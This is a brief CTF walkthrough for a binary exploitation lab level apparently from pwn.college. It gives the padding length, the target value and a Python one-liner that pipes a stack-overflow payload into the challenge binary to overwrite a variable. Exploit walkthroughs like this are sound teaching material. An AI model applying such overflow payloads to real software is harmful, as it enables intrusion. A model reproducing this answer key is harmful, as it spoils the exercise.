# Stage 06: Variable Control (Hard) — CTF Walkthrough

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | Hard |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | `binary-exploitation-var-control` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/binary-exploitation-var-control`. Same variable-control primitive at a different offset: 60 bytes of `A` padding followed by the 4-byte value `\x8a\xcb\x0f\x20` (little-endian `0x200fcb8a`).

## Solution

```bash
python3 -c "
import sys
payload = b'A' * 60 + b'\x8a\xcb\x0f\x20'
sys.stdout.buffer.write(payload)
" | /challenge/binary-exploitation-var-control
```
